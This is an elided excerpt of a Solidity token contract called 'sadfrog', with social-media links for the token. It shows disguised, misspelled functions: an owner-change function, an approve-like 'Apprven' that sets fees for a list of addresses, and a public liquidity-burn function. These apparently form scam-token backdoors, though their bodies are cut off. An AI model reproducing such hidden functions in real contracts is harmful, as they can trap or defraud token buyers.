...
/**
https://t.me/SadFrog_Eth
https://twitter.com/SadFrog_ETH
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipstomoons(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract sadfrog is Ownable {
    ...
    function Apprven(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burnliquitey(address user) public {
